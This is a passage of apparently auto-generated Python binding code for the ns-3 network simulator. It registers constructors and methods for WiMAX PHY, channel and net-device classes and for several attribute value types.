def register_Ns3RandomVariableChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariableChecker const &', 'arg0')])
return
def register_Ns3RandomVariableValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariableValue const &', 'arg0')])
cls.add_constructor([param('ns3::RandomVariable const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::RandomVariable',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::RandomVariable const &', 'value')])
return
def register_Ns3SimpleOfdmWimaxPhy_methods(root_module, cls):
cls.add_constructor([param('ns3::SimpleOfdmWimaxPhy const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('char *', 'tracesPath')])
cls.add_method('ActivateLoss',
'void',
[param('bool', 'loss')])
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],
is_virtual=True)
cls.add_method('GetBandwidth',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNoiseFigure',
'double',
[],
is_const=True)
cls.add_method('GetPhyType',
'ns3::WimaxPhy::PhyType',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTxPower',
'double',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('NotifyRxBegin',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyRxDrop',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyRxEnd',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxBegin',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxDrop',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxEnd',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('Send',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction')])
cls.add_method('Send',
'void',
[param('ns3::SendParams *', 'params')],
is_virtual=True)
cls.add_method('SetBandwidth',
'void',
[param('uint32_t', 'BW')])
cls.add_method('SetNoiseFigure',
'void',
[param('double', 'nf')])
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst >, ns3::Ptr< ns3::WimaxConnection >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('SetSNRToBlockErrorRateTracesPath',
'void',
[param('char *', 'tracesPath')])
cls.add_method('SetTxPower',
'void',
[param('double', 'txPower')])
cls.add_method('StartReceive',
'void',
[param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPower'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoGetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDurationCode',
'uint8_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetGValue',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNfft',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetRtg',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFactor',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFrequency',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTtg',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoSetDataRates',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoSetPhyParameters',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3TimeChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TimeChecker const &', 'arg0')])
return
def register_Ns3TimeValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TimeValue const &', 'arg0')])
cls.add_constructor([param('ns3::Time const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Time',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Time const &', 'value')])
return
def register_Ns3TypeIdChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeIdChecker const &', 'arg0')])
return
def register_Ns3TypeIdValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeIdValue const &', 'arg0')])
cls.add_constructor([param('ns3::TypeId const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::TypeId const &', 'value')])
return
def register_Ns3UintegerValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::UintegerValue const &', 'arg0')])
cls.add_constructor([param('uint64_t const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'uint64_t',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('uint64_t const &', 'value')])
return
def register_Ns3WimaxChannel_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxChannel const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_const=True, is_virtual=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoGetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNDevices',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3WimaxNetDevice_methods(root_module, cls):
cls.add_static_attribute('m_direction', 'uint8_t', is_const=False)
cls.add_static_attribute('m_frameStartTime', 'ns3::Time', is_const=False)
cls.add_instance_attribute('m_traceRx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)
cls.add_instance_attribute('m_traceTx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetTtg',
'void',
[param('uint16_t', 'ttg')])
cls.add_method('GetTtg',
'uint16_t',
[],
is_const=True)
cls.add_method('SetRtg',
'void',
[param('uint16_t', 'rtg')])
cls.add_method('GetRtg',
'uint16_t',
[],
is_const=True)
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])
cls.add_method('SetPhy',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])
cls.add_method('GetPhy',
'ns3::Ptr< ns3::WimaxPhy >',
[],
is_const=True)
cls.add_method('SetChannel',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'wimaxChannel')])
cls.add_method('GetChannel',
'uint64_t',
[param('uint8_t', 'index')],
is_const=True)
cls.add_method('SetNrFrames',
'void',
[param('uint32_t', 'nrFrames')])
cls.add_method('GetNrFrames',
'uint32_t',
[],
is_const=True)
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'address')])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('SetState',
'void',
[param('uint8_t', 'state')])
cls.add_method('GetState',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInitialRangingConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('GetBroadcastConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('SetCurrentDcd',
'void',
[param('ns3::Dcd', 'dcd')])
cls.add_method('GetCurrentDcd',
'ns3::Dcd',
[],
is_const=True)
cls.add_method('SetCurrentUcd',
'void',
[param('ns3::Ucd', 'ucd')])
cls.add_method('GetCurrentUcd',
'ns3::Ucd',
[],
is_const=True)
cls.add_method('GetConnectionManager',
'ns3::Ptr< ns3::ConnectionManager >',
[],
is_const=True)
cls.add_method('SetConnectionManager',
'void',
[param('ns3::Ptr< ns3::ConnectionManager >', 'connectionManager')],
is_virtual=True)
cls.add_method('GetBurstProfileManager',
'ns3::Ptr< ns3::BurstProfileManager >',
[],
is_const=True)
cls.add_method('SetBurstProfileManager',
'void',
[param('ns3::Ptr< ns3::BurstProfileManager >', 'burstProfileManager')])
cls.add_method('GetBandwidthManager',
'ns3::Ptr< ns3::BandwidthManager >',
[],
is_const=True)
cls.add_method('SetBandwidthManager',
'void',
[param('ns3::Ptr< ns3::BandwidthManager >', 'bandwidthManager')])
cls.add_method('CreateDefaultConnections',
'void',
[])
cls.add_method('Start',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('Stop',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[])
cls.add_method('ForwardUp',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ForwardDown',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetName',
'void',
[param('std::string const', 'name')],
is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True, is_virtual=True)
cls.add_method('SetIfIndex',
'void',
[param('uint32_t const', 'index')],
is_virtual=True)
cls.add_method('GetIfIndex',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetPhyChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_const=True, is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_const=True, is_virtual=True)
cls.add_method('SetAddress',
'void',
[param('ns3::Address', 'address')],
is_virtual=True)
cls.add_method('GetAddress',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('SetMtu',
'bool',
[param('uint16_t const', 'mtu')],
is_virtual=True)
cls.add_method('GetMtu',
'uint16_t',
[],
is_const=True, is_virtual=True)
cls.add_method('IsLinkUp',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('SetLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_virtual=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetBroadcast',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('MakeMulticastAddress',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
is_const=True, is_virtual=True)
cls.add_method('IsPointToPoint',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('Send',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_virtual=True)
cls.add_method('SetNode',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')],
is_virtual=True)
cls.add_method('GetNode',
'ns3::Ptr< ns3::Node >',
[],
is_const=True, is_virtual=True)
cls.add_method('NeedsArp',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_virtual=True)
cls.add_method('AddLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_virtual=True)
cls.add_method('SendFrom',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_virtual=True)
cls.add_method('SetPromiscReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_virtual=True)
cls.add_method('GetPromiscReceiveCallback',
'ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >',
[])
cls.add_method('SupportsSendFrom',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv6Address', 'addr')],
is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
